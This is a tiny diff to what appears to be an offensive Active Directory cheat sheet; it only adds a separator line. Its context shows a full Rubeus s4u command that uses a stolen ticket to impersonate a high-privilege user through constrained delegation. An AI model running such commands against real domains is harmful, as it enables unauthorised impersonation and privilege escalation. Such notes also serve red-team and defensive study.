@@ -1029,6 +1029,7 @@ Rubeus (optional ```/domain``` ```/dc``` ; and ```/ptt```):
 
 ```Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:high_priv_user /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo} /ptt```
 
+* * * 
 
 #### Example self chain:
 
